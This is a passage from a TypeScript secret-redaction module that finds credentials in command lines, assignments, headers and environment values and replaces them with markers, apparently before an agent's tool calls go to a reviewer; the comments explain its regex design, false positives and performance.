 * linear however many flags a line holds; a command and its credential flag
 * sit next to each other in every real spelling.
 */
const COMMAND_LOOKBACK = 120;

/** A flag, wherever one starts. The boundary group is what keeps this linear. */
const FLAG_TOKEN_RE = /(^|\\[nrt]|[^A-Za-z0-9_-])(--?[A-Za-z][A-Za-z0-9_-]*)/g;
const WORD_BEFORE_RE = /[A-Za-z0-9_-]/;
const WORD_AFTER_RE = /[A-Za-z0-9_]/;

/** Whether `word` appears in `window` as a whole word. */
function hasCommandWord(window: string, word: string): boolean {
  for (let i = window.indexOf(word); i >= 0; i = window.indexOf(word, i + 1)) {
    const before = i === 0 ? "" : window[i - 1];
    const after = window[i + word.length] ?? "";
    if (!WORD_BEFORE_RE.test(before) && !WORD_AFTER_RE.test(after)) return true;
  }
  return false;
}

/** The text behind `at` a gated flag may look in: one command, bounded. */
function commandWindow(lower: string, at: number): string {
  let from = Math.max(0, at - COMMAND_LOOKBACK);
  for (let i = at - 1; i >= from; i--) {
    const c = lower[i];
    if (c === "\n" || c === "\r" || c === ";" || c === "&" || c === "|") {
      from = i + 1;
      break;
    }
  }
  return lower.slice(from, at);
}

/**
 * Every word that can gate a flag. A word that is nowhere in the text gates
 * nothing, and checking that ONCE per string is what keeps a line of repeated
 * `-p ` from costing a window and a dozen searches per flag: 448 ms for a
 * full-sized envelope of them, against the 600 ms this file's own budget test
 * asserts.
 */
const GATING_WORDS: ReadonlyArray<string> = [
  ...new Set([
    ...GATED_CREDENTIAL_FLAGS.flatMap((g) => [...g.commands, ...(g.also === undefined ? [] : [g.also])]),
    ...BASIC_AUTH_COMMANDS,
  ]),
];

/** Where the one command-line argument that starts at `start` ends. */
function credentialArgumentEnd(text: string, start: number): { from: number; to: number } {
  const q = text[start];
  if (q === '"' || q === "'") {
    for (let i = start + 1; i < text.length; i++) {
      const c = text[i];
      if (c === "\n" || c === "\r") break;
      if (c === q) return { from: start + 1, to: i };
    }
  }
  let i = start;
  while (i < text.length) {
    const c = text[i];
    // A marker an earlier rule wrote has spaces in it and is one unit.
    if (c === "<" && text.startsWith(AUTH_MARKER_HEAD, i)) {
      const closed = text.indexOf(">", i);
      if (closed > 0) {
        i = closed + 1;
        continue;
      }
    }
    if (c === " " || c === "\t" || c === "\n" || c === "\r" || c === ";" || c === "&" || c === "|") break;
    if (c === "\\" && /[nr]/.test(text[i + 1] ?? "")) break;
    i++;
  }
  return { from: start, to: i };
}

/**
 * Whether a flag's value is GLUED to it rather than separated: `-ppw`, `-p'pw'`
 * and `-p$PW` are all one argument. The flag token stops at the first character
 * that cannot be part of a flag NAME, so a glued value that opens with a quote,
 * a `$` or any other punctuation is not in the token and has to be seen here.
 */
function hasGluedValue(text: string, at: number): boolean {
  const c = text[at];
  if (c === undefined) return false;
  return c !== " " && c !== "\t" && c !== "=" && c !== "\n" && c !== "\r" && c !== ";" && c !== "&" && c !== "|";
}

/** Where the value of a flag ending at `flagEnd` starts, or -1 if it has none. */
function credentialValueStart(text: string, flagEnd: number, attached: boolean): number {
  if (attached) return flagEnd;
  let i = flagEnd;
  if (text[i] === "=") i++;
  else if (hasGluedValue(text, i)) return i;
  else while (text[i] === " " || text[i] === "\t") i++;
  if (i === flagEnd) return -1; // nothing but a terminator behind the flag
  const v = text[i];
  if (v === undefined || v === "\n" || v === "\r" || v === ";" || v === "&" || v === "|") return -1;
  return i;
}

/**
 * Every credential argument in `text`, as one marker each. The quotes around a
 * value stay where they were written, around the marker, so the secret handed
 * to the scrub pass is the BARE value — the form its copies elsewhere in the
 * envelope are in.
 */
function redactCredentialArguments(text: string, counter: { n: number; found: string[] }): string {
  let out = "";
  let last = 0;
  // Lowercased once per string, and only when a gated flag is actually met.
  let lower: string | null = null;
  let present: ReadonlySet<string> | null = null;
  const gates = (w: string): boolean => {
    if (present === null) {
      lower = text.toLowerCase();
      present = new Set(GATING_WORDS.filter((x) => (lower as string).includes(x)));
    }
    return present.has(w);
  };
  FLAG_TOKEN_RE.lastIndex = 0;
  for (let m = FLAG_TOKEN_RE.exec(text); m !== null; m = FLAG_TOKEN_RE.exec(text)) {
    const flagAt = m.index + m[1].length;
    if (flagAt < last) continue;
    const raw = m[2];
    const token = raw.toLowerCase();
    let win: string | null = null;
    const near = (w: string): boolean => gates(w) && hasCommandWord((win ??= commandWindow(lower as string, flagAt)), w);
    let flagEnd = -1;
    let attached = false;
    let label = "credential argument";
    let basicAuth = false;
    if (CREDENTIAL_FLAGS.has(token)) {
      flagEnd = flagAt + raw.length;
      label = "assigned secret";
    } else if (BASIC_AUTH_FLAGS.has(token) && BASIC_AUTH_COMMANDS.some(near)) {
      flagEnd = flagAt + raw.length;
      label = "basic auth";
      basicAuth = true;
    } else {
      for (const g of GATED_CREDENTIAL_FLAGS) {
        const cand = g.flag.startsWith("--") ? token : raw;
        if (!cand.startsWith(g.flag)) continue;
        // `-p'pw'` and `-p$PW` are the glued form too: the flag token stops in
        // front of a character a flag NAME cannot hold.
        const glued = cand.length > g.flag.length || hasGluedValue(text, flagAt + g.flag.length);
        if (g.attachedOnly === true && !glued) continue;
        if (!g.commands.some(near)) continue;
        if (g.also !== undefined && !near(g.also)) continue;
        flagEnd = flagAt + g.flag.length;
        attached = glued;
        break;
      }
    }
    if (flagEnd < 0) continue;
    let start = credentialValueStart(text, flagEnd, attached);
    if (start < 0) continue;
    let arg = credentialArgumentEnd(text, start);
    if (basicAuth) {
      // `-u user:pass`: only what follows the FIRST colon is the credential.
      const colon = text.indexOf(":", arg.from);
      if (colon < 0 || colon >= arg.to) continue;
      start = colon + 1;
      const inner = text[start];
      arg = inner === '"' || inner === "'" ? credentialArgumentEnd(text, start) : { from: start, to: arg.to };
    }
    if (arg.to <= arg.from) continue;
    const value = text.slice(arg.from, arg.to);
    // Already replaced by an earlier rule: a second pass must be a no-op.
    if (withoutMarkers(value).trim() === "") continue;
    out += text.slice(last, arg.from) + marker(label);
    counter.n++;
    counter.found.push(value);
    last = arg.to;
    FLAG_TOKEN_RE.lastIndex = arg.to;
  }
  FLAG_TOKEN_RE.lastIndex = 0;
  return last === 0 ? text : out + text.slice(last);
}

/**
 * `config set <name> <value>`: aws configure, npm/pnpm/yarn config, git config.
 * Redacted only when the NAME says it is a secret and the value looks like one
 * — prose such as "run `x config --token <token>` and …" has the same shape.
 */
const CONFIG_SET_RE =
  /(\b(?:config(?:ure)?[ \t]+set|config)(?:[ \t]+--?[A-Za-z][\w-]*)*[ \t]+)([A-Za-z_/@.:][^\s"'=<>]*)([ \t]+)("[^"\n]*"|'[^'\n]*'|[^\s"';&|]+)/g;

/**
 * `NAME=value`, `NAME: value`, `"name": "value"`, `--name=value`, `?name=value`,
 * `name = "value"` — every syntax an assignment is written in, in one scan. The
 * NAME decides whether the value is a secret (see `secretNameStrength`) and the
 * value has to look like a literal (see `assignmentValueIsSecret`).
 *
 *   1  the token boundary in front of the name
 *   2  optional quote before the name (JSON; possibly JSON-escaped)
 *   3  the name, keeping a flag's leading dashes
 *   4  optional quote after the name
 *   5  the separator
 *   6  the value's opening quote   7  the quoted value
 *   8  an unquoted value
 *
 * Group 1 is what keeps the scan LINEAR, and it is why the name is not checked
 * for a token boundary in code afterwards. Without it the name could start at
 * any character of a token: on a 4 000-character run of identifier characters
 * with no separator in it, the engine consumed the rest of the run at every one
 * of those positions and backtracked over it — 35 ms for one string, and
 * `buildEnvelope` redacts up to 576 of them, so a tool call carrying a batch of
 * base64 blobs stalled the PreToolUse hook for seconds before Jev was even
 * called. Requiring a boundary character makes every position inside a token
 * fail in one step (7 s → 30 ms for that envelope). The boundary is consumed
 * rather than a lookbehind because a lookbehind drops the regex JIT, which
 * costs more than it saves on every other string; it is re-emitted in front of
 * the replacement. `\n`, `\r` and `\t` count because input nested two levels
 * deep is JSON-stringified, where a name at the start of a line follows the two
 * characters `\` `n` — that alternative comes first so the name is `API_KEY`
 * rather than `nAPI_KEY`.
 *
 * A quoted value's CLOSING quote is matched by a lookahead, so the match ends
 * just before it and leaves it to be the boundary of whatever comes next:
 * `TOKEN="a"PASSWORD=x` has no character to spare between the two, and
 * consuming that quote hid the second assignment from the scan entirely.
 */
const ASSIGNMENT_RE =
  /(^|\\[nrt]|[^A-Za-z0-9_.-])((?:\\?["'])?)(-{0,2}[A-Za-z_][A-Za-z0-9_.-]*)((?:\\?["'])?)([ \t]*(?::=|=|:(?!\/\/))[ \t]*)(?:(\\?["'])(.*?)(?=\6)|([^\s"'`<>(){}[\],;&|\\]+))/g;

/**
 * `--password hunter2`: a secret-named flag and a separate value.
 *
 *   1  the token boundary   2  the flag   3  the space
 *   4  the value's quote   5  the quoted value   6  an unquoted value
 *
 * Boundary group as in `ASSIGNMENT_RE`, and for the same two reasons: `-` is a
 * name character, so without it every hyphen of a kebab-case run started a flag
 * whose tail was consumed and backtracked (`x--token` and `a-b c` were then
 * declined in code, after the cost had been paid). The closing quote is left
 * unconsumed as in `ASSIGNMENT_RE`, for the same reason.
 */
const FLAG_VALUE_RE =
  /(^|\\[nrt]|[^A-Za-z0-9_.-])(--?[A-Za-z][A-Za-z0-9_-]*)([ \t]+)(?:(["'])(.*?)(?=\4)|([^\s"'`<>(){}[\],;&|\\-][^\s"'`<>(){}[\],;&|\\]*))/g;

/** Long runs of token characters: candidates for the high-entropy rule. Greedy, so a match is a whole run. */
const LONG_TOKEN_RE = /[A-Za-z0-9_-]{32,}/g;

// ── Secret names ─────────────────────────────────────────────────────────────

/** A secret on their own, as the last word of a name or the whole of it. */
const STRONG_LAST_WORDS = new Set([
  "secret",
  "password",
  "passwd",
  "passphrase",
  "pwd",
  "credential",
  "credentials",
  "apikey",
  "cookie",
]);
/** `<one of these>_key` is a secret key rather than a lookup key. */
const STRONG_KEY_QUALIFIERS = new Set(["api", "secret", "private", "master", "signing", "encryption", "client", "auth", "access"]);
/**
 * Only a secret as the last word of a COMPOUND name. `key` and `auth` are
 * ordinary words in code — React's `key` prop is on every JSX list — so a bare
 * `key=` is not enough; `STRIPE_KEY=` is. (A bare all-caps `KEY=` is: that is an
 * environment variable, not a prop.)
 */
const WEAK_LAST_WORDS = new Set(["key", "pat", "pass", "auth", "sig", "signature", "dsn"]);
/** The word before `key`/`token` that makes it a lookup key or a counter, not a credential. */
const NOT_SECRET_QUALIFIERS = new Set([
  "primary", "foreign", "sort", "partition", "range", "hash", "row", "unique", "composite", "object",
  "cache", "storage", "local", "idempotency", "dedup", "dedupe", "lookup", "map", "dict", "index",
  "list", "group", "field", "item", "node", "event", "message", "column", "table", "form", "route",
  "query", "i18n", "translation", "locale", "react", "redis", "s3", "bucket", "file", "path", "state",
  "store", "registry", "setting", "settings", "config", "design", "theme", "color", "next", "page",
  "continuation", "cursor", "max", "min", "num", "total", "count", "input", "output", "completion",
  "prompt", "cancel", "cancellation", "sync", "lock", "rate", "limit", "sort", "order", "public",
  "publishable", "pub", "ssh", "gpg", "pgp",
  // Predicates and verbs: `has_key`, `is_token`, `rotate_secret_key`, `mask_token`.
  "has", "is", "use", "with", "no", "needs", "require", "requires", "enable", "enabled", "allow",
  "missing", "valid", "invalid", "check", "get", "load", "read", "parse", "validate", "generate",
  "create", "rotate", "fetch", "find", "show", "print", "mask", "masked", "redact", "redacted", "hide",
  "hidden",
  // Values that say they are not real.
  "example", "sample", "dummy", "fake", "mock", "placeholder",
]);
/** A name ending in one of these describes the secret; its value is not the secret. */
const META_SUFFIXES = new Set([
  "dir", "dirs", "path", "paths", "file", "files", "filename", "name", "names", "id", "ids", "arn",
  "ref", "refs", "length", "len", "count", "days", "ttl", "version", "url", "uri", "env", "manager",
  "store", "provider", "type", "types", "format", "policy", "policies", "rotation", "enabled",
  "required", "min", "max", "header", "field", "param", "params", "prompt", "label", "placeholder",
  "hint", "error", "errors", "message", "regex", "re", "pattern", "patterns", "validator", "strength",
  "scanning", "scanner", "detection", "mode", "list", "set", "map", "size", "bytes", "expiry",
  "expires", "expiration", "timeout", "exposure", "hash",
]);

function nameComponents(name: string): string[] {
  return name
    .replace(/([a-z0-9])([A-Z])/g, "$1_$2")
    .toLowerCase()
    .split(/[^a-z0-9]+/)
    .filter(Boolean);
}

/**
 * Whether an identifier's name says its value is a credential.
 *
 * `strong`: the value is a secret whatever it looks like (`DATABASE_PASSWORD`,
 * `client_secret`, `GITHUB_TOKEN`, `apiKey`). `weak`: only a value that ALSO
 * looks like a token counts (`STRIPE_KEY`, `sentry_dsn`). `null`: not a secret
 * name (`sort_key`, `max_tokens`, `SECRETS_DIR`, `PASSWORD_MIN_LENGTH`,
 * `NEXT_PUBLIC_API_KEY`).
 */
export function secretNameStrength(name: string): "strong" | "weak" | null {
  const bare = name.replace(/^[-"'\\]+|["'\\]+$/g, "");
  const comps = nameComponents(bare);
  if (comps.length === 0) return null;
  if (comps.some((c) => c === "public" || c === "publishable")) return null;
  const last = comps[comps.length - 1];
  const prev = comps.length > 1 ? comps[comps.length - 2] : undefined;
  if (STRONG_LAST_WORDS.has(last)) return "strong";
  if (last === "key" && prev && STRONG_KEY_QUALIFIERS.has(prev)) return "strong";
  if (prev && NOT_SECRET_QUALIFIERS.has(prev)) return null;
  if (last === "token") return "strong";
  // Run-together names the component split cannot see into: PGPASSWORD,
  // NPMTOKEN, GHTOKEN, MYAPIKEY.
  if (/(?:password|passwd|passphrase|secret|token|apikey)$/.test(last) && !NOT_SECRET_QUALIFIERS.has(last)) return "strong";
  if (comps.length === 1 && /^[A-Z0-9]{2,}KEY$/.test(bare)) return "strong"; // ORGKEY, DEPLOYKEY
  if (WEAK_LAST_WORDS.has(last) && (comps.length > 1 || /^[A-Z]+$/.test(bare))) {
    // An ENVIRONMENT-style name (`ADMIN_KEY`, `DEPLOY_KEY`) holds a credential
    // whatever its value looks like — `ADMIN_KEY="dev-admin-key"` is a live
    // login on a dev stack. The same word in code (`adminKey`) is too often a
    // lookup key to trust without a token-shaped value.
    return /^[A-Z][A-Z0-9_]*$/.test(bare) ? "strong" : "weak";
  }
  // A secret word earlier in the name, with a last word that still names the
  // value rather than describing it: Rails' SECRET_KEY_BASE.
  const earlier = comps.slice(0, -1);
  if (earlier.some((c) => c === "secret" || c === "password" || c === "passwd") && !META_SUFFIXES.has(last)) return "strong";
  return null;
}

// ── Value shapes ─────────────────────────────────────────────────────────────

const NON_VALUE_WORDS = new Set(["true", "false", "null", "none", "nil", "undefined", "yes", "no", "on", "off"]);
const TYPED_ARRAY_RE = /^(?:Big)?(?:Uint|Int)\d+Array$|^Float\d+Array$|^Uint8ClampedArray$/;
/** Type names and schema words that follow `NAME: ` in code and config, not a value. */
const TYPE_WORDS = new Set([
  "str", "string", "int", "integer", "number", "float", "double", "bool", "boolean", "bytes", "any",
  "unknown", "object", "optional", "secretstr", "secretbytes", "union", "list", "dict", "map", "array",
  "text", "char", "varchar", "required",
]);

/** `$VAR`, `${VAR}`, `` `cmd` ``, `{expr}`, `(expr)`, `<placeholder>`, `[list]`, `%VAR%`. */
const REFERENCE_START_RE = /^[$`{(<[%]/;

/** True for a string that could be a literal value rather than a reference, a path or a keyword. */
function isLiteral(value: string): boolean {
  if (!value) return false;
  if (REFERENCE_START_RE.test(value)) return false;
  if (/^(?:\/|\.\.?\/|~\/|~$|[A-Za-z]:\\)/.test(value)) return false; // a path names where a secret is, not the secret
  if (NON_VALUE_WORDS.has(value.toLowerCase())) return false;
  if (/^[*x•.#-]+$/i.test(value)) return false; // already masked
  return true;
}

/** Fraction of adjacent characters that change class (lower/upper/digit/other). */
function classSwitchRate(s: string): number {
  const cls = (c: string): number => (c >= "a" && c <= "z" ? 0 : c >= "A" && c <= "Z" ? 1 : c >= "0" && c <= "9" ? 2 : 3);
  let switches = 0;
  for (let i = 1; i < s.length; i++) if (cls(s[i]) !== cls(s[i - 1])) switches++;
  return s.length > 1 ? switches / (s.length - 1) : 0;
}

/**
 * Looks like a generated token rather than a word, a name or a phrase: it has a
 * digit, a lower→upper case hump (`aBcD`, not the capital of `Bearer`), or a
 * symbol a word does not carry.
 */
function tokenLike(value: string): boolean {
  if (/\s/.test(value)) return false;
  if (/^[a-z]+(?:[-_.][a-z]+)*$/.test(value)) return false; // app-settings, created_at
  if (/^[A-Z]+(?:_[A-Z0-9]+)*$/.test(value) && !/\d/.test(value)) return false; // OTHER_VAR_NAME
  return /\d/.test(value) || /[a-z][A-Z]/.test(value) || /[^A-Za-z0-9_.-]/.test(value);
}

/** A shell-quoted argument split into its quote character and its bare value. */
function unquote(arg: string): [quote: string, value: string] {
  const m = /^(["'])([\s\S]*)\1$/.exec(arg);
  return m ? [m[1], m[2]] : ["", arg];
}

/**
 * An unquoted value after `: ` or ` = ` in code is usually an expression, not a
 * literal: `token: string`, `password: hashedPassword`, `apiKey: config.apiKey`,
 * `secret: Uint8Array`. Those stay; `password: hunter2` does not. A long run of
 * letters that switches case like a random string does is kept as a secret too.
 */
function looksLikeExpression(value: string): boolean {
  if (TYPED_ARRAY_RE.test(value)) return true;
  if (/^[A-Za-z_$][\w$]*(?:\.[A-Za-z_$][\w$]*)+[?!]?$/.test(value)) return true; // member access
  if (/^[A-Za-z_$][A-Za-z_$]*[?!]?$/.test(value)) {
    return !(value.length >= 16 && classSwitchRate(value) >= 0.3);
  }
  return false;
}

/**
 * Whether an assignment's value is a secret, given how strongly its name says so.
 *
 * `spaced` is true for `: ` / ` = ` separators, where an unquoted value is more
 * often an expression than a literal; `urlQuery` for `?name=` / `&name=`, where
 * even a bare `key=` or `sig=` is a credential.
 */
function assignmentValueIsSecret(
  name: string,
  value: string,
  opts: { quoted: boolean; spaced: boolean; urlQuery: boolean; flag?: boolean; colon?: boolean },
): boolean {
  let strength = secretNameStrength(name);
  if (!strength && opts.urlQuery && /^(?:key|sig|auth|code|access_token|client_secret)$/i.test(name)) strength = "weak";
  if (!strength) return false;
  if (!isLiteral(value)) return false;
  const bare = name.replace(/^[-"'\\]+|["'\\]+$/g, "");
  if (value.toLowerCase() === bare.toLowerCase()) return false; // f(api_key=api_key), "password": "Password"
  // A "quoted value" that starts with a delimiter is the tail of a string the
  // name sat inside: `print('has_key=', …)` quotes `, …` up to the next quote.
  if (opts.quoted && /^[,;)\]}\s]/.test(value)) return false;
  const envStyle = /^[A-Z][A-Z0-9_]*$/.test(bare);
  if (!opts.quoted) {
    // YAML has no expressions, so `POSTGRES_PASSWORD: changeme` under an
    // environment-style name is a literal. A type annotation on the same name
    // (`DB_PASSWORD: string`, `SECRET_KEY: str`), a camelCase variable
    // (`{ DB_PASSWORD: dbPassword }`) and member access (`API_TOKEN:
    // process.env.X`) are still code.
    const yamlLiteral =
      opts.colon === true && envStyle && /^[A-Za-z]+$/.test(value) && !/[a-z][A-Z]/.test(value) && !TYPE_WORDS.has(value.toLowerCase());
    if (opts.spaced && looksLikeExpression(value) && !yamlLiteral) return false;
    if (!opts.spaced) {
      if (/^[A-Za-z_$][\w$]*(?:\.[A-Za-z_$][\w$]*)+$/.test(value) && !/\d/.test(value)) return false; // token=self.token
      // `authToken=userAuthTokenValue` in code is a variable, not a secret; an
      // environment-style name (`PASSWORD=letmein`) keeps any literal, and so
      // does a command-line flag (`mysql --password=letmein`): a shell has no
      // variables without a `$`.
      if (!envStyle && !name.startsWith("-") && /^[A-Za-z_$][A-Za-z_$]*$/.test(value) && classSwitchRate(value) < 0.45) return false;
    }
  }
  if (opts.flag) return value.length >= (strength === "strong" ? 6 : 8) && tokenLike(value);
  if (strength === "strong") return value.length >= 3;
  return value.length >= 8 && tokenLike(value);
}

/**
 * Whether `value`, found under the key `name` in structured input (an MCP
 * tool's arguments, a JSON body), is a secret. The value is a literal string
 * by construction, so only its name and its shape decide.
 */
export function isSecretFieldValue(name: string, value: string): boolean {
  return assignmentValueIsSecret(name, value, { quoted: true, spaced: false, urlQuery: false });
}

/**
 * The value of a credential header in STRUCTURED input — `{"headers":
 * {"Authorization": "Basic …"}}` from an HTTP-calling MCP tool, where the
 * name arrives as an object key rather than in the text.
 *
 * Same blunt rule as the text path, and the same reason: the NAME decides, the
 * value is never classified. Whatever sits under `Authorization`, `x-api-key`
 * or `Cookie` is replaced whole — a known scheme, an unknown one, a reference
 * (`Bearer $TOKEN`), a bare scheme word, prose. Three rounds were spent asking
 * whether the first word was a scheme, whether the value read like prose and
 * whether it was reference-shaped, and each of those questions sent a live
 * credential to Jev at least once: a 25-character `sk-` key passes for a
 * scheme, `Hawk`/`NTLM`/`Splunk` pass for prose, and this value never goes
 * through `redactSecrets`, so anything kept here is sent as it stands.
 *
 * Returns the marker and the credential it removed, or null when the field is
 * not a credential header or its value is blank. The reported secret is what
 * `scrubKnownSecrets` looks for in the rest of the envelope, so a value that
 * already holds a marker reports nothing: the earlier rule that wrote that
 * marker reported what was secret in it.
 */
export function redactAuthorizationField(name: string, value: string): { text: string; secret: string } | null {
  const field = name.trim();
  if (!CREDENTIAL_FIELD_RE.test(field)) return null;
  const v = value.trim();
  if (!v) return null;
  return { text: marker(credentialHeaderLabel(field)), secret: v.includes(AUTH_MARKER_HEAD) ? "" : v };
}

/**
 * A long token that looks generated: at least 32 characters, all three of
 * lower case, upper case and digits, and a character class that changes as
 * often as a random string's does. A random base64url token switches class at
 * ~64% of positions; camelCase identifiers, even long ones with a digit, switch
 * at a word boundary and sit well under half. Hex digests (git SHAs, sha256
 * sums, UUIDs) are single-case and never qualify, which is deliberate: they are
 * everywhere in real commands and almost never secret.
 *
 * Two more exclusions came from measuring real transcripts: a token that is
 * mostly digits and separators (`2026-08-31T10_22_33_123Z-debug-0`, an npm log
 * name) and a token built from words (`Offchain_Labs_whitepaper-2024-…`, a
 * docs asset with a hash suffix). A random token has letters in ~80% of its
 * positions and almost never a whole separator-delimited segment that is a word.
 */
export function looksRandomToken(t: string): boolean {
  if (t.length < 32) return false;
  if (/^(?:sha(?:1|224|256|384|512)|md5)[-_]/i.test(t)) return false;
  const upper = t.replace(/[^A-Z]/g, "").length;
  const lower = t.replace(/[^a-z]/g, "").length;
  if (upper < 3 || lower < 3 || !/[0-9]/.test(t)) return false;
  if ((upper + lower) / t.length < 0.5) return false;
  if (t.split(/[-_]/).some((seg) => /^[A-Z]?[a-z]{3,}$/.test(seg) || /^[A-Z]{4,}$/.test(seg))) return false;
  return classSwitchRate(t) >= 0.45;
}

/**
 * True when the token at `offset` is part of a spelled-out digest —
 * `sha512-<base64>` (an npm integrity field, whose `+` and `/` split it into
 * several random-looking tokens) or `sha256=<base64>` (a wheel's RECORD). A
 * hash is not a secret, and these are everywhere in lockfiles.
 */
function insideDigest(whole: string, offset: number): boolean {
  let start = offset;
  const floor = Math.max(0, offset - 200);
  while (start > floor && /[A-Za-z0-9+/=_:-]/.test(whole[start - 1])) start--;
  return /^(?:sha(?:1|224|256|384|512)|md5)[-=:]/i.test(whole.slice(start, start + 8));
}

// ── This machine's own secrets ───────────────────────────────────────────────

let envSecretSource: Record<string, string | undefined> | null = null;
let envSecretCache: ReadonlyArray<readonly [string, string]> | null = null;

/**
 * The values of this process's secret-named environment variables, as exact
 * strings, longest first. An exact match is the one redaction with no false
 * positives, and it catches every secret shape no pattern knows — a Datadog
 * key is 32 hex characters, indistinguishable from a digest by shape alone.
 */
function envSecrets(): ReadonlyArray<readonly [string, string]> {
  if (envSecretCache) return envSecretCache;
  const env = envSecretSource ?? (process.env as Record<string, string | undefined>);
  const found: Array<readonly [string, string]> = [];
  for (const [name, value] of Object.entries(env)) {
    if (typeof value !== "string" || value.length < 12 || value.length > 4096) continue;
    if (!secretNameStrength(name) || !isLiteral(value) || !tokenLike(value)) continue;
    found.push([value, name]);
  }
  found.sort((a, b) => b[0].length - a[0].length);
  envSecretCache = found;
  return found;
}

/**
 * Replace the environment the literal-secret rule reads (tests), or restore the
 * real one with `null`. Clears the cache either way.
 */
export function setEnvSecretSource(env: Record<string, string | undefined> | null): void {
  envSecretSource = env;
  envSecretCache = null;
}

// ── The redactor ─────────────────────────────────────────────────────────────

type Groups = string[];

/**
 * A global replace whose callback may DECLINE a match (return null), counting
 * the replacements it makes.
 *
 * A declined match gives back all but its first character. `String.replace`
 * would resume scanning after it, and a declined match can contain the very
 * thing a rule is looking for: `raw = 'AWS_SECRET_ACCESS_KEY=wJalr…'` is first
 * seen as the assignment `raw = '…'`, declined because `raw` is no secret name,
 * and the secret-named assignment INSIDE its value was never looked at. A
 * rule whose declined match cannot hide a nested candidate — a token run, a
 * vendor prefix inside a longer word — passes `onDecline: "skip"` and resumes
 * after it instead.
 */
function replaceCounting(
  text: string,
  re: RegExp,
  fn: (match: string, groups: Groups, offset: number, whole: string) => string | null,
  counter: { n: number; found: string[] },
  onDecline: "rescan" | "skip" = "rescan",
): string {
  re.lastIndex = 0;
  let out = "";
  let last = 0;
  for (let m = re.exec(text); m !== null; m = re.exec(text)) {
    const groups = m.slice(1).map((g) => g ?? "");
    const replacement = m[0].length > 0 ? fn(m[0], groups, m.index, text) : null;
    if (replacement === null) {
      re.lastIndex = onDecline === "skip" && m[0].length > 0 ? m.index + m[0].length : m.index + 1;
      continue;
    }
    out += text.slice(last, m.index) + replacement;
    last = m.index + m[0].length;
    counter.n++;
    counter.found.push(replacedPart(m[0], replacement));
  }
  re.lastIndex = 0;
  return last === 0 ? text : out + text.slice(last);
}

/**
 * The part of `match` a replacement removed: what lies between their common
 * prefix and suffix. It is what `scrubKnownSecrets` then looks for elsewhere
 * in the envelope, so a rule has to put back everything around the secret that
 * was not the secret — a QUOTE above all. A rule that dropped a quoted value
 * whole recorded `'hunter2'`, which appears nowhere else, and the bare copy in
 * the agent's own description went out with the request.
 */
function replacedPart(match: string, replacement: string): string {
  let p = 0;
  while (p < match.length && p < replacement.length && match[p] === replacement[p]) p++;
  let s = 0;
  while (s < match.length - p && s < replacement.length - p && match[match.length - 1 - s] === replacement[replacement.length - 1 - s]) s++;
  return match.slice(p, match.length - s);
}

/**
 * Replace every copy of an already-found secret. A secret is only RECOGNISED
 * where its context gives it away (`aws_secret_access_key <value>`), but the
 * same bytes can travel on without that context — the path facts lift bare
 * tokens out of the command, a human pastes the value into a message. Only
 * values distinctive enough to scrub blindly are used: 16+ characters, or 8+
 * that look like a token. Longest first, as for the environment's values: a
 * shorter secret that is a prefix of a longer one would otherwise split the
 * longer one's copy and leave its tail behind.
 */
export function scrubKnownSecrets(text: string, known: Iterable<string>): Redacted {
  let out = text;
  let count = 0;
  for (const secret of [...known].sort((a, b) => b.length - a.length)) {
    if (!(secret.length >= 16 || (secret.length >= 8 && tokenLike(secret))) || !out.includes(secret)) continue;
    const parts = out.split(secret);
    count += parts.length - 1;
    out = parts.join(marker("repeated secret"));
  }
  return { text: out, count };
}

/**
 * Redact every secret in `text`, replacing each with a `<redacted:label>`
 * marker and counting them.
 *
 * Rules run from the most exact to the most heuristic, so the most specific
 * label wins and later rules never re-match an earlier marker (a value that
 * starts with `<` is never a literal).
 */
export function redactSecrets(text: string): Redacted {
  const { text: out, count } = redactSecretsDetailed(text);
  return { text: out, count };
}

/** `redactSecrets`, plus the literal secrets it replaced. */
export function redactSecretsDetailed(text: string): RedactedDetail {
  if (!text) return { text, count: 0, found: [] };
  const c = { n: 0, found: [] as string[] };
  let out = text;

  // 1. Exact values of this machine's secret-named environment variables.
  for (const [value, name] of envSecrets()) {
    if (!out.includes(value)) continue;
    const parts = out.split(value);
    c.n += parts.length - 1;
    c.found.push(value);
    out = parts.join(marker(`value of $${name}`));
  }

  // 2. Whole PEM blocks, before the shared rule eats just the header; then
  //    the lines in front of a footer whose header was cut away.
  out = redactPemBlocks(out, c);
  out = redactOrphanFooters(out, c);

  // 3. The shared floor.
  for (const [re, label, keepsPrefix] of SHARED_RULES) {
    out = replaceCounting(out, re, (_m, g) => (keepsPrefix ? (g[0] ?? "") : "") + marker(label), c);
  }

  // 4. Vendor prefixes and webhook URLs.
  for (const [re, label] of VENDOR_RULES) {
    out = replaceCounting(out, re, (_m, _g, offset, whole) => (atTokenBoundary(whole, offset) ? marker(label) : null), c, "skip");
  }
  for (const [re, label] of WEBHOOK_RULES) out = replaceCounting(out, re, (_m, g) => g[0] + marker(label), c);

  // 5. Credentials in URLs and HTTP auth.
  // Both URL rules need a `://` to match at all, and the check is one pass
  // against two scans of every string the envelope sends.
  if (out.includes("://")) {
    out = replaceCounting(
      out,
      URL_CREDENTIALS_RE,
      (_m, g) => (isLiteral(g[3]) ? `${g[0]}${g[1]}${g[2]}:${marker("URL credentials")}@` : null),
      c,
    );
    out = replaceCounting(out, URL_TOKEN_USERINFO_RE, (_m, g) => (tokenLike(g[2]) ? `${g[0]}${g[1]}${marker("URL credentials")}@` : null), c);
  }
  out = redactCredentialHeaders(out, c);
  out = replaceCounting(
    out,
    BEARER_RE,
    // A compound id (`dev-admin-key`) counts too: prose puts a word after
    // "bearer", not a hyphenated identifier — except `token-based` and kin.
    (_m, g) =>
      tokenLike(g[1]) || (/^[a-z0-9]+(?:[-_][a-z0-9]+)+$/.test(g[1]) && !/^tokens?[-_]/.test(g[1]))
        ? `${g[0]}${marker("bearer token")}`
        : null,
    c,
  );

  // 6. Credentials passed positionally, or behind a flag that names one.
  // The quotes around a value are re-emitted around the marker rather than
  // dropped with it: the replaced command stays quoted as it was written, and
  // the secret these rules hand to the scrub pass is the BARE value, which is
  // the form its copies elsewhere in the envelope are in.
  out = redactCredentialArguments(out, c);
  out = replaceCounting(
    out,
    CONFIG_SET_RE,
    // The NAME decides, as it does for a credential flag: `aws configure set
    // aws_secret_access_key swordfish` is a credential although nothing about
    // the value says so. Only a value already replaced is left alone.
    (_m, g) => {
      const [quote, value] = unquote(g[3]);
      return secretNameStrength(g[1]) !== null && withoutMarkers(value).trim() !== ""
        ? `${g[0]}${g[1]}${g[2]}${quote}${marker("assigned secret")}${quote}`
        : null;
    },
    c,
  );

  // 7. Assignments whose name says the value is a secret.
